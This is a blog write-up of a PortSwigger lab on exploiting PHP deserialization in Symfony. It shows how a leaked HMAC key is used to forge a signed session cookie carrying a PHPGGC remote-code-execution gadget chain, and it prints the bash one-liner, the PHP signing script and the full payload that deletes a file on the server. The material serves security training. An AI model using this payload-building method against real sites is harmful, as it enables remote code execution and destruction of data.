<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="generator" content="Jekyll">
  

  <title>Lab: Exploiting PHP deserialization with a pre-built gadget chain - Diaries of a Modern Ninja</title>

  <link rel="stylesheet" href="/css/main.css">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  
  <link rel="alternate" type="application/rss+xml" title="Diaries of a Modern Ninja" href="https://nima.ninja/feed.xml"> <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Lab: Exploiting PHP deserialization with a pre-built gadget chain" />
<meta name="author" content="Nima" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Lab Description: This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don‚Äôt have source code access, you can still exploit this lab‚Äôs insecure deserialization using pre-built gadget chains." />
<meta property="og:description" content="Lab Description: This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don‚Äôt have source code access, you can still exploit this lab‚Äôs insecure deserialization using pre-built gadget chains." />
<link rel="canonical" href="https://nima.ninja/blog/2022/exploiting-php-deserialization-with-a-pre-built-gadget-chain" />
<meta property="og:url" content="https://nima.ninja/blog/2022/exploiting-php-deserialization-with-a-pre-built-gadget-chain" />
<meta property="og:site_name" content="Diaries of a Modern Ninja" />
<meta property="og:image" content="https://nima.ninja/blog/assets/supply-chain.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-08-11T00:00:00-04:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://nima.ninja/blog/assets/supply-chain.png" />
<meta property="twitter:title" content="Lab: Exploiting PHP deserialization with a pre-built gadget chain" />
<meta name="twitter:site" content="@cSh4rk" />
<meta name="twitter:creator" content="@cSh4rk" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nima"},"dateModified":"2022-08-11T00:00:00-04:00","datePublished":"2022-08-11T00:00:00-04:00","description":"Lab Description: This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don‚Äôt have source code access, you can still exploit this lab‚Äôs insecure deserialization using pre-built gadget chains.","headline":"Lab: Exploiting PHP deserialization with a pre-built gadget chain","image":"https://nima.ninja/blog/assets/supply-chain.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://nima.ninja/blog/2022/exploiting-php-deserialization-with-a-pre-built-gadget-chain"},"url":"https://nima.ninja/blog/2022/exploiting-php-deserialization-with-a-pre-built-gadget-chain"}</script>
<!-- End Jekyll SEO tag -->

</head>


  <body>
    <div id="wrapper">
      <header>
  <div>
    <a href="/">
    
    <h1><!--email_off-->nima@home:~$<!--/email_off--></h1>
    </a>
    <div class="header-links">
      <a href="/about"><h2 class="header-link">About</h2></a>
<a href="/"><h2 class="header-link">All</h2></a>
<a href="/blog/"><h2 class="header-link">Blog</h2></a>
<a href="/books/"><h2 class="header-link">Books</h2></a>
<a href="/links/"><h2 class="header-link">Links</h2></a>
<a href="/tags/"><h2 class="header-link">Tags</h2></a>
<a href="/contact"><h2 class="header-link">Contact</h2></a>
<a href="/kevin-mitnick" class="no-decoration"><h2 class="header-link" title="RIP Kevin Mitnick">üñ§</h2></a>

<!--<a href="/feed.xml"><h2 class="header-link">RSS</h2></a>-->

    </div>
  </div>
</header>

      <div class="container">
        <section id="main_content">
          <article>
  <h2>Lab: Exploiting PHP deserialization with a pre-built gadget chain</h2>
  <div class="postitem">
    
      <a href="/blog/" class="no-decoration"><code class="language-plaintext highlighter-rouge-tag">blog</code></a>
    
    
      <code class="posttag"><a href="/tags/#web-application-security" class="no-decoration">Web Application Security</a></code>
    
      <code class="posttag"><a href="/tags/#web-security-academy" class="no-decoration">Web Security Academy</a></code>
    
      <code class="posttag"><a href="/tags/#labs" class="no-decoration">Labs</a></code>
    
      <code class="posttag"><a href="/tags/#insecure-deserialization" class="no-decoration">Insecure Deserialization</a></code>
    
      <code class="posttag"><a href="/tags/#remote-code-execution" class="no-decoration">Remote Code Execution</a></code>
    
      <code class="posttag"><a href="/tags/#gadget-chains" class="no-decoration">Gadget Chains</a></code>
    
      <code class="posttag"><a href="/tags/#php" class="no-decoration">PHP</a></code>
    
      <code class="posttag"><a href="/tags/#phpggc" class="no-decoration">PHPGGC</a></code>
    
  </div>
  <span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 3H18V1H16V3H8V1H6V3H5C3.9 3 3 3.89 3 5V19C3 20.11 3.9 21 5 21H19C20.11 21 21 20.11 21 19V5C21 3.89 20.11 3 19 3M19 19H5V9H19V19M19 7H5V5H19M7 11H12V16H7" /></svg></span>
  <time datetime="2022-08-11T00:00:00-04:00" class="by-line"><strong>Published: </strong>11 Aug 2022</time>
  
  <p><br /></p>
<picture>
  <source srcset="/blog/assets/supply-chain.avif" type="image/avif" />
<source srcset="/blog/assets/supply-chain.webp" type="image/webp" />
  <img src="/blog/assets/supply-chain.png" width="256" height="256" alt="" loading="eager" fetchpriority="high" />
</picture>

<p><sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>
<br /></p>

<h3 id="lab-link">Lab Link</h3>
<p><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain">Lab: Exploiting PHP deserialization with a pre-built gadget chain</a></p>

<p><br /></p>
<h3 id="lab-description">Lab Description</h3>
<hr />
<p><br />
This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don‚Äôt have source code access, you can still exploit this lab‚Äôs insecure deserialization<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> using pre-built gadget chains.</p>

<p>To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the <code class="language-plaintext highlighter-rouge">morale.txt</code> file from Carlos‚Äôs home directory.</p>

<p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p>

<p><br /></p>
<h3 id="solutions">Solutions</h3>
<hr />
<p><br /></p>
<h3 id="solution-1-my-solution">Solution 1: My Solution</h3>
<p>It is recommended to use Linux or a Unix-based operating system for using pre-built gadget chain tools like PHPGGC for PHP or Ysoserial for Java because of powerful bash command tools that are already in your arsenal or can be downloaded easily. So let‚Äôs begin.</p>

<p>At first, let‚Äôs get more information by browsing lab pages, when we log in with <code class="language-plaintext highlighter-rouge">wiener:peter</code> credentials, we see a session cookie in Burp like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2a2xvbHZkNmw4bDIwN2dzMHd1Zms4bGR2bXc1NGV2cCI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22e14415c3060a4b056821d84317015c0d8e63b648%22%7D
</code></pre></div></div>

<p>It is a URL-encoded string, which when decoded in Burp decoder we get this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2a2xvbHZkNmw4bDIwN2dzMHd1Zms4bGR2bXc1NGV2cCI7fQ==","sig_hmac_sha1":"e14415c3060a4b056821d84317015c0d8e63b648"}
</code></pre></div></div>

<p>As you can see, it seems that the token part is signed with hmac_sha1 algorithm. Also the token part in this string is base64-encoded, when decoded it is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vklolvd6l8l207gs0wufk8ldvmw54evp";}
</code></pre></div></div>

<p>It is a serialized PHP object. So we can test if there is any insecure deserialization vulnerability that we can exploit, Since it is a signed session cookie, if we want to edit this serialized object, we need the key for the hash algorithm to sign our payload value so we need to search for clues of the key used. When surfing lab pages, in the source of the website we can find this commented line:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- &lt;a href=/cgi-bin/phpinfo.php&gt;Debug&lt;/a&gt; --&gt;</span>
</code></pre></div></div>

<p>so we use this link to open the <code class="language-plaintext highlighter-rouge">phpinfo</code> page, in this page we can find the secret key:</p>

<p><br /></p>
<picture>
  <source srcset="/blog/assets/web-security-academy-php-deserialization-secret-key.webp" type="image/webp" />
<source srcset="/blog/assets/web-security-academy-php-deserialization-secret-key.avif" type="image/avif" />
  <img src="/blog/assets/web-security-academy-php-deserialization-secret-key.png" width="995" height="424" alt="" loading="lazy" decoding="async" />
</picture>

<p><br /></p>

<p>We test it to make sure this is the key that is used for signing the session cookie.</p>

<p>With this command you can sign a value:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"value"</span> | openssl sha1 <span class="nt">-hmac</span> <span class="s2">"key"</span>
</code></pre></div></div>

<p>We can test this:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2a2xvbHZkNmw4bDIwN2dzMHd1Zms4bGR2bXc1NGV2cCI7fQ=="</span> | openssl sha1 <span class="nt">-hmac</span> <span class="s2">"g8ffja92adxkuz3681mg16suuoo3sbxd"</span>
</code></pre></div></div>

<p>When we run this code we get this signed value:
<code class="language-plaintext highlighter-rouge">e14415c3060a4b056821d84317015c0d8e63b648</code> and check it with the ‚Äúsig_hmac_sha1‚Äù value in the decoded session cookie above and we see the values are matched, So we can use this secret key to hash our own serialized payload.</p>

<p>Also in the <code class="language-plaintext highlighter-rouge">/cgi-bin/phpinfo.php</code> page above we can see that the website is using Zend Engine:</p>

<p><br /></p>
<picture>
  <source srcset="/blog/assets/web-security-academy-php-deserialization-zend-engine.avif" type="image/avif" />
<source srcset="/blog/assets/web-security-academy-php-deserialization-zend-engine.webp" type="image/webp" />
  <img src="/blog/assets/web-security-academy-php-deserialization-zend-engine.png" width="952" height="75" alt="" loading="lazy" decoding="async" />
</picture>

<p><br /></p>

<p>Please pay attention not to confuse Zend engine with Zend Framework so we need to find out more clues about what PHP framework is used so that we can create an appropriate payload for it.</p>

<p>When the session cookie is manipulated in Burp repeater, an error page is returned in response and we get our clue in the error description:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Internal Server Error: Symfony Version: 4.3.6
</code></pre></div></div>

<p>So the website is using Symfony framework for PHP. With all this information, we can create our final payload, we use PHPGGC tool to build our payload, first download this tool from its Github page<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>.</p>

<p>Use this command to find related payloads for Symfony framework:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./phpggc <span class="nt">-l</span> symfony
</code></pre></div></div>

<p>We get this list:</p>

<p><br /></p>
<picture>
  <source srcset="/blog/assets/web-security-academy-php-deserialization-phpggc.avif" type="image/avif" />
<source srcset="/blog/assets/web-security-academy-php-deserialization-phpggc.webp" type="image/webp" />
  <img src="/blog/assets/web-security-academy-php-deserialization-phpggc.png" width="822" height="238" alt="" loading="lazy" decoding="async" />
</picture>

<p><br /></p>

<p>We start from the first RCE command in the list and test to see which one is working.</p>

<p>We use the secret key found in our bash command, This bash command is created to do multiple tasks and create a final payload:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">command</span><span class="o">=</span><span class="si">$(</span>./phpggc <span class="nt">-f</span> <span class="nt">-b</span> Symfony/RCE1 <span class="s2">"rm /home/carlos/morale.txt"</span><span class="si">)</span><span class="p">;</span><span class="nv">x</span><span class="o">=</span><span class="si">$(</span> <span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$command</span><span class="si">)</span><span class="p">;</span><span class="nv">y</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$x</span> | openssl sha1 <span class="nt">-hmac</span> <span class="s2">"g8ffja92adxkuz3681mg16suuoo3sbxd"</span> | <span class="nb">cut</span> <span class="nt">-c</span> 14-<span class="si">)</span><span class="p">;</span>urlencode <span class="s1">'{"token":"'</span><span class="nv">$x</span><span class="s1">'","sig_hmac_sha1":"'</span><span class="nv">$y</span><span class="s1">'"}'</span>
</code></pre></div></div>

<p>You can substitute your desired PHPGGC command in the above code and also your own secret key that you‚Äôve found and get the resulting payload in the correct final format.</p>

<p>In the above command:</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> in <code class="language-plaintext highlighter-rouge">echo</code> command is to remove the trailing newline characters.</p>

<p><code class="language-plaintext highlighter-rouge">-b</code> in <code class="language-plaintext highlighter-rouge">phpggc</code> is to base64 encode the gadget chain.</p>

<p><code class="language-plaintext highlighter-rouge">-f</code> in <code class="language-plaintext highlighter-rouge">phpggc</code> is to fast destruct. Here is the description of this flag from PHPGGC Github page:</p>

<p>‚ÄúPHPGGC implements a <code class="language-plaintext highlighter-rouge">--fast-destruct</code> (<code class="language-plaintext highlighter-rouge">-f</code>) flag, that will make sure your serialized object will be destroyed right after the <code class="language-plaintext highlighter-rouge">unserialize()</code> call, and not at the end of the script. I‚Äôd recommend using it for every <code class="language-plaintext highlighter-rouge">__destruct</code> vector, as it improves reliability. For instance, if PHP script raises an exception after the call, the <code class="language-plaintext highlighter-rouge">__destruct</code> method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.‚Äù</p>

<p>So it is recommended to use this flag.</p>

<p><code class="language-plaintext highlighter-rouge">cut -c 14-</code> command cuts the resulting string because the result of the signed value of <code class="language-plaintext highlighter-rouge">openssl</code> command is something like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SHA1<span class="o">(</span>stdin<span class="o">)=</span> e14415c3060a4b056821d84317015c0d8e63b648
</code></pre></div></div>

<p>And we should begin at character 14 and remove the additional beginning characters of <code class="language-plaintext highlighter-rouge">SHA1(stdin)= </code></p>

<p>So we get this final payload from the above command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%7B%22token%22%3A%22YToyOntpOjc7Tzo0MzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxBcGN1QWRhcHRlciI6Mzp7czo2NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcQWJzdHJhY3RBZGFwdGVyAG1lcmdlQnlMaWZldGltZSI7czo5OiJwcm9jX29wZW4iO3M6NTg6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBuYW1lc3BhY2UiO2E6MDp7fXM6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXEFic3RyYWN0QWRhcHRlcgBkZWZlcnJlZCI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO31pOjc7aTo3O30%3D%22%2C%22sig_hmac_sha1%22%3A%22e6496d1876437637e6aca6a408cc1b7281bec1fd%22%7D
</code></pre></div></div>

<p>We replace this string with the session cookie in Burp repeater and Carlos‚Äôs <code class="language-plaintext highlighter-rouge">morale.txt</code> file is deleted and the lab is solved!</p>

<p><br /></p>
<h3 id="solution-2-web-security-academys-solution">Solution 2: Web Security Academy‚Äôs Solution</h3>
<ol>
  <li>
    <p>Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the <strong>Inspector</strong> panel.</p>
  </li>
  <li>
    <p>Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.</p>
  </li>
  <li>
    <p>Copy the decoded cookie from the Inspector and paste it into Decoder.</p>
  </li>
  <li>
    <p>In Decoder, highlight the token and then select <strong>Decode as &gt; Base64</strong>. Notice that the token is actually a serialized PHP object.</p>
  </li>
  <li>
    <p>In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that:</p>
  </li>
</ol>

<ul>
  <li>A developer comment discloses the location of a debug file at <code class="language-plaintext highlighter-rouge">/cgi-bin/phpinfo.php</code>.</li>
  <li>The error message reveals that the website is using the Symfony 4.3.6 framework.</li>
</ul>

<ol start="6">
  <li>
    <p>Request the <code class="language-plaintext highlighter-rouge">/cgi-bin/phpinfo.php</code> file in Burp Repeater and observe that it leaks some key information about the website, including the <code class="language-plaintext highlighter-rouge">SECRET_KEY</code> environment variable. Save this key; you‚Äôll need it to sign your exploit later.</p>
  </li>
  <li>
    <p>Download the ‚ÄúPHPGGC‚Äù tool and execute the following command:</p>
  </li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./phpggc Symfony/RCE4 <span class="nb">exec</span> <span class="s1">'rm /home/carlos/morale.txt'</span> | <span class="nb">base64</span>
</code></pre></div></div>

<p>This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos‚Äôs <code class="language-plaintext highlighter-rouge">morale.txt</code> file.</p>

<ol start="8">
  <li>You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:</li>
</ol>

<ul>
  <li>Assign the object you generated in PHPGGC to the <code class="language-plaintext highlighter-rouge">$object</code> variable.</li>
  <li>Assign the secret key that you copied from the <code class="language-plaintext highlighter-rouge">phpinfo.php</code> file to the <code class="language-plaintext highlighter-rouge">$secretKey</code> variable.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$object</span> <span class="o">=</span> <span class="s2">"OBJECT-GENERATED-BY-PHPGGC"</span><span class="p">;</span>
<span class="nv">$secretKey</span> <span class="o">=</span> <span class="s2">"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"</span><span class="p">;</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s1">'{"token":"'</span> <span class="mf">.</span> <span class="nv">$object</span> <span class="mf">.</span> <span class="s1">'","sig_hmac_sha1":"'</span> <span class="mf">.</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha1'</span><span class="p">,</span> <span class="nv">$object</span><span class="p">,</span> <span class="nv">$secretKey</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'"}'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span>
</code></pre></div></div>

<p>This will output a valid, signed cookie to the console.</p>

<ol start="9">
  <li>In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.</li>
</ol>

<p><br /></p>
<h3 id="external-links"><em>External Links</em></h3>
<hr />
<ul>
  <li>
    <h4 id="lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain"><a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain">Lab: Exploiting PHP deserialization with a pre-built gadget chain</a></h4>
  </li>
</ul>

<p><br /></p>
<h3 id="references"><em>References</em></h3>
<hr />
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>Icon made by <a href="https://www.flaticon.com/authors/freepik">Freepik</a> from <a href="https://www.flaticon.com/">www.flaticon.com</a>¬†<a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p><a href="https://portswigger.net/web-security/deserialization">Insecure deserialization | Web Security Academy</a>¬†<a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p><a href="https://github.com/ambionics/phpggc">PHPGGC: PHP Generic Gadget Chains</a>¬†<a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

</article>

        </section>
      </div>
    </div>

     
  
    <footer class="site-footer">
  <div class="row">
    <div class="footer-wrapper">
      <div class="footer-col-social col-5 col-s-4">
        <ul>
  
    <li class="social-media-list">
      <a title="GitHub Profile" href="https://github.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="X Profile" href="https://x.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="24px" height="24px" clip-rule="evenodd" baseProfile="basic"><polygon fill="#616161" points="41,6 9.929,42 6.215,42 37.287,6"/><polygon fill="#fff" fill-rule="evenodd" points="31.143,41 7.82,7 16.777,7 40.1,41" clip-rule="evenodd"/><path fill="#616161" d="M15.724,9l20.578,30h-4.106L11.618,9H15.724 M17.304,6H5.922l24.694,36h11.382L17.304,6L17.304,6z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a rel="me" title="Mastodon Profile" href="https://infosec.exchange/@cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.327 8.566c0-4.339-2.843-5.61-2.843-5.61-1.433-.658-3.894-.935-6.451-.956h-.063c-2.557.021-5.016.298-6.45.956 0 0-2.843 1.272-2.843 5.61 0 .993-.019 2.181.012 3.441.103 4.243.778 8.425 4.701 9.463 1.809.479 3.362.579 4.612.51 2.268-.126 3.541-.809 3.541-.809l-.075-1.646s-1.621.511-3.441.449c-1.804-.062-3.707-.194-3.999-2.409a4.523 4.523 0 0 1-.04-.621s1.77.433 4.014.536c1.372.063 2.658-.08 3.965-.236 2.506-.299 4.688-1.843 4.962-3.254.434-2.223.398-5.424.398-5.424zm-3.353 5.59h-2.081V9.057c0-1.075-.452-1.62-1.357-1.62-1 0-1.501.647-1.501 1.927v2.791h-2.069V9.364c0-1.28-.501-1.927-1.502-1.927-.905 0-1.357.546-1.357 1.62v5.099H6.026V8.903c0-1.074.273-1.927.823-2.558.566-.631 1.307-.955 2.228-.955 1.065 0 1.872.409 2.405 1.228l.518.869.519-.869c.533-.819 1.34-1.228 2.405-1.228.92 0 1.662.324 2.228.955.549.631.822 1.484.822 2.558v5.253z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  


  
    <li class="social-media-list">
      <a title="Discord Server" href="https://discord.gg/4btHxXWwgQ"><span class="icon"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title/><path d="M20.222 0c1.406 0 2.54 1.137 2.607 2.475V24l-2.677-2.273-1.47-1.338-1.604-1.398.67 2.205H3.71c-1.402 0-2.54-1.065-2.54-2.476V2.48C1.17 1.142 2.31.003 3.715.003h16.5L20.222 0zm-6.118 5.683h-.03l-.202.2c2.073.6 3.076 1.537 3.076 1.537-1.336-.668-2.54-1.002-3.744-1.137-.87-.135-1.74-.064-2.475 0h-.2c-.47 0-1.47.2-2.81.735-.467.203-.735.336-.735.336s1.002-1.002 3.21-1.537l-.135-.135s-1.672-.064-3.477 1.27c0 0-1.805 3.144-1.805 7.02 0 0 1 1.74 3.743 1.806 0 0 .4-.533.805-1.002-1.54-.468-2.14-1.404-2.14-1.404s.134.066.335.2h.06c.03 0 .044.015.06.03v.006c.016.016.03.03.06.03.33.136.66.27.93.4.466.202 1.065.403 1.8.536.93.135 1.996.2 3.21 0 .6-.135 1.2-.267 1.8-.535.39-.2.87-.4 1.397-.737 0 0-.6.936-2.205 1.404.33.466.795 1 .795 1 2.744-.06 3.81-1.8 3.87-1.726 0-3.87-1.815-7.02-1.815-7.02-1.635-1.214-3.165-1.26-3.435-1.26l.056-.02zm.168 4.413c.703 0 1.27.6 1.27 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334.002-.74.573-1.338 1.27-1.338zm-4.543 0c.7 0 1.266.6 1.266 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334 0-.74.57-1.338 1.27-1.338z"/></svg>
</span><span>Sharks</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="PGP Key" href="/assets/CEE9A66A2F5C6187E4242B0425669795B037FEF2.asc.txt"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.451 17.337l-2.451 2.663h-2v2h-2v2h-6v-5l6.865-6.949c1.08 2.424 3.095 4.336 5.586 5.286zm11.549-9.337c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-3-3c0-1.104-.896-2-2-2s-2 .896-2 2 .896 2 2 2 2-.896 2-2z"/></svg>
</span><span>pgp key</span></a>
    </li>
  

  <li class="social-media-list">
    <a title="RSS Feed" href="/feed.xml"><span class="icon-nofill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#ee802f" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"/></svg>
</span><span>rss</span></a>
  </li>
</ul>

      </div>
      <div class="footer-col-badges col-3 col-s-5">
        <ul>
  
    <li class="social-media-list">
      
        <!-- local HTB badge -->
        <a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/768488">
          <picture>
  <source srcset="/assets/768488.avif" type="image/avif">
<source srcset="/assets/768488.webp" type="image/webp">
  <img src="/assets/768488.png" width="220" height="50" alt="Hack The Box Profile" loading="lazy" decoding="async" class="no-responsive">
</picture>

        </a>
      
    </li>
  

  
    <li class="social-media-list">
      
        <!-- local TryHackMe badge -->
        <a title="TryHackMe Profile" href="https://tryhackme.com/p/nima">
          <picture>
  <source srcset="/assets/nima.avif" type="image/avif">
<source srcset="/assets/nima.webp" type="image/webp">
  <img src="/assets/nima.png" width="329" height="88" alt="TryHackMe Profile" loading="lazy" decoding="async" class="no-responsive">
</picture>

        </a>
      
    </li>
  
</ul>


      </div>
      <div class="footer-col-copyright col-10 col-s-10 tiny-footer">
        <span>
          favicon made by <a href="https://www.flaticon.com/authors/juicy-fish">juicy-fish</a> from <a href="https://www.flaticon.com">www.flaticon.com</a>
        </span>
        <br>
        <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
          <span>
              <b>Nima</b>
          </span>
          
          <span>¬© 2025</span>
        </a>
      </div>
    </div>
  </div>
</footer>


    
  </body>
</html>
